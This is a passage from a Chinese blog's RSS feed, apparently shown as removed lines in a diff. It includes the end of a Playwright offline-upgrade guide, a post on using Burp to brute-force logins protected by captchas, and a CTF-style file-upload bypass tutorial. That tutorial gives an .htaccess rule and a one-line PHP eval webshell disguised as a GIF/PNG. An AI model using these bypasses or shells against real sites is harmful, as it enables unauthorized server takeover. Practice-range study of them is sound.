src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/11.png" alt="11"></p><p>系统判断都在这里，只保留自己需要的系统，注视掉其他的，重新运行即可。</p><p>例如我需要<code>linux</code>的</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/12.png" alt="12"></p><p>重新运行</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/13.png" alt="13"></p><p>可以看到，路径都变成<code>linux</code>的了</p><h1 id="另外要注意芯片架构，arm的和非arm的自行注意哈"><a href="#另外要注意芯片架构，arm的和非arm的自行注意哈" class="headerlink" title="另外要注意芯片架构，arm的和非arm的自行注意哈"></a>另外要注意芯片架构，arm的和非arm的自行注意哈</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后总结一下各个版本可能需要的路径和包名，版本自行替换哈</p><p>域名可替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;https://playwright.azureedge.net&#x27;</span><br><span class="line">&#x27;https://playwright-akamai.azureedge.net&#x27;</span><br><span class="line">&#x27;https://playwright-verizon.azureedge.net&#x27;</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-with-symbols-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium-tip-of-tree/1136/chromium-tip-of-tree-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox/1422/firefox-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox-beta/1422/firefox-beta-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/webkit/1883/webkit-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/ffmpeg/1009/ffmpeg-win64.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/android/1000/android.zip</span><br></pre></td></tr></table></figure><p>mac(Intel)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-mac.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-with-symbols-mac.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium-tip-of-tree/1136/chromium-tip-of-tree-mac.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox/1422/firefox-mac-13.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox/1422/firefox-asan-mac-13.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox-beta/1422/firefox-beta-mac-13.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/webkit/1883/webkit-mac-13.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/ffmpeg/1009/ffmpeg-mac.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/android/1000/android.zip</span><br></pre></td></tr></table></figure><p>linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-linux.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-with-symbols-linux.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/chromium-tip-of-tree/1136/chromium-tip-of-tree-linux.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox/1422/firefox-ubuntu-20.04.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox/1422/firefox-asan-ubuntu-20.04.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/firefox-beta/1422/firefox-beta-ubuntu-20.04.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/webkit/1883/webkit-ubuntu-20.04.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/ffmpeg/1009/ffmpeg-linux.zip</span><br><span class="line"></span><br><span class="line">https://playwright.azureedge.net/builds/android/1000/android.zip</span><br></pre></td></tr></table></figure>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/PlayWright/">PlayWright</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/PlayWright/">PlayWright</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的安全之旅（一）——Burp爆破</title>
-      <link>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Burp%E7%88%86%E7%A0%B4/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Burp%E7%88%86%E7%A0%B4/</guid>
-      <pubDate>Sun, 30 Jul 2023 12:17:00 GMT</pubDate>
-      
-      <description>&lt;p&gt;对于带验证码的爆破，需要对验证码进行识别&lt;/p&gt;
-&lt;p&gt;可以使用&lt;a href=&quot;https://github.com/f0ng/captcha-killer-modified&quot;&gt;captcha-killer-modified&lt;/a&gt;搭配&lt;code&gt;Burp&lt;/code&gt;进行爆破&lt;/p&gt;
-&lt;p&gt;同时推荐&lt;a href=&quot;https://github.com/sml2h3/ddddocr&quot;&gt;&lt;code&gt;ddddocr&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;现在是2023年9月7日，&lt;code&gt;Pillow==9.5.0&lt;/code&gt;当前的&lt;code&gt;ddddocr&lt;/code&gt;并未对版本进行兼容&lt;/p&gt;
-&lt;p&gt;我改了两个docker，有需要可以直接拉取部署&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# centos&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker pull 329106954/ocr_server:centos&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mac Inter芯片&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker pull 329106954/ocr_server:mac&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;验证码填写&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST /ocr/b64/text HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Authorization:Basic f0ngauth&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Connection: keep-alive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: raw&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Length: 8332&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;@BASE64&amp;gt;&amp;lt;@IMG_RAW&amp;gt;&amp;lt;/@IMG_RAW&amp;gt;&amp;lt;/@BASE64&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-</description>
-      
-      
-      
-      <content:encoded><![CDATA[<p>对于带验证码的爆破，需要对验证码进行识别</p><p>可以使用<a href="https://github.com/f0ng/captcha-killer-modified">captcha-killer-modified</a>搭配<code>Burp</code>进行爆破</p><p>同时推荐<a href="https://github.com/sml2h3/ddddocr"><code>ddddocr</code></a></p><p>现在是2023年9月7日，<code>Pillow==9.5.0</code>当前的<code>ddddocr</code>并未对版本进行兼容</p><p>我改了两个docker，有需要可以直接拉取部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># centos</span><br><span class="line">docker pull 329106954/ocr_server:centos</span><br><span class="line"># mac Inter芯片</span><br><span class="line">docker pull 329106954/ocr_server:mac</span><br></pre></td></tr></table></figure><p>验证码填写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /ocr/b64/text HTTP/1.1</span><br><span class="line">Authorization:Basic f0ngauth</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: raw</span><br><span class="line">Content-Length: 8332</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;</span><br></pre></td></tr></table></figure>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/Burp/">Burp</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Burp%E7%88%86%E7%A0%B4/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的安全之旅（二）——文件上传</title>
-      <link>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
-      <pubDate>Sun, 30 Jul 2023 12:17:00 GMT</pubDate>
-      
-      <description>&lt;p&gt;文件上传是个经典问题&lt;/p&gt;
-&lt;p&gt;推荐靶场：&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot;&gt;upload-labs&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;我们可以在这个靶场中进行文件上传绕过的练习&lt;/p&gt;
-&lt;p&gt;先说&lt;code&gt;webshell&lt;/code&gt;，我们写个一句话木马先&lt;/p&gt;
-&lt;p&gt;这里留个大哥若干年前的总结 &lt;a href=&quot;https://www.webshell.cc/2265.html&quot;&gt;webshell一句话木马大全&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;接下来我们聊聊文件上传的漏洞&lt;/p&gt;
-&lt;h1 id=&quot;一-啥防护没有&quot;&gt;&lt;a href=&quot;#一-啥防护没有&quot; class=&quot;headerlink&quot; title=&quot;一.啥防护没有&quot;&gt;&lt;/a&gt;一.啥防护没有&lt;/h1&gt;&lt;p&gt;直接一句话木马上传就完事了&lt;/p&gt;
-&lt;h1 id=&quot;二-前端文件后缀判断&quot;&gt;&lt;a href=&quot;#二-前端文件后缀判断&quot; class=&quot;headerlink&quot; title=&quot;二.前端文件后缀判断&quot;&gt;&lt;/a&gt;二.前端文件后缀判断&lt;/h1&gt;&lt;p&gt;打开开发者工具，提交文件，看是否存在网络请求&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<p>文件上传是个经典问题</p><p>推荐靶场：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p><p>我们可以在这个靶场中进行文件上传绕过的练习</p><p>先说<code>webshell</code>，我们写个一句话木马先</p><p>这里留个大哥若干年前的总结 <a href="https://www.webshell.cc/2265.html">webshell一句话木马大全</a></p><p>接下来我们聊聊文件上传的漏洞</p><h1 id="一-啥防护没有"><a href="#一-啥防护没有" class="headerlink" title="一.啥防护没有"></a>一.啥防护没有</h1><p>直接一句话木马上传就完事了</p><h1 id="二-前端文件后缀判断"><a href="#二-前端文件后缀判断" class="headerlink" title="二.前端文件后缀判断"></a>二.前端文件后缀判断</h1><p>打开开发者工具，提交文件，看是否存在网络请求</p><p>不存在则说明是前端判断，直接把<code>js</code>禁用了就完事了</p><h1 id="三-MIME判断"><a href="#三-MIME判断" class="headerlink" title="三.MIME判断"></a>三.MIME判断</h1><p>使用<code>burp</code>抓包，将<code>Content-Type: application/xxx</code></p><p>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>任意允许类型上传即可。</p><h1 id="四-黑名单上传"><a href="#四-黑名单上传" class="headerlink" title="四.黑名单上传"></a>四.黑名单上传</h1><h2 id="4-1-简单的黑名单上传"><a href="#4-1-简单的黑名单上传" class="headerlink" title="4.1 简单的黑名单上传"></a>4.1 简单的黑名单上传</h2><p>黑名单的检测不严谨，比如只是限制<br><code>.asp,.aspx,.php..jsp</code><br>这种</p><p>直接把木马文件后缀改一下， <code>php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml</code>这些文件后缀在某些环境都会被当作php解析</p><h2 id="4-2-如果上述文件都被限制了？"><a href="#4-2-如果上述文件都被限制了？" class="headerlink" title="4.2 如果上述文件都被限制了？"></a>4.2 如果上述文件都被限制了？</h2><p>还有大小写呢，<code>Php,PHP,PHp</code>等等</p><h2 id="4-3-如果后台校验规则已经添加了转小写"><a href="#4-3-如果后台校验规则已经添加了转小写" class="headerlink" title="4.3 如果后台校验规则已经添加了转小写"></a>4.3 如果后台校验规则已经添加了转小写</h2><p>搬出<code>.htaccess</code></p><p><code>.htaccess</code>内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>主要作用是将<code>png</code>文件识别为<code>php</code>执行</p><p>先将<code>php</code>文件修改后缀为<code>png</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[sb])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传<code>png</code>，再上传<code>.htaccess</code>，御剑链接<code>png</code>即可</p>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/Burp/">Burp</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/07/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#disqus_thread</comments>
       
     </item>
     
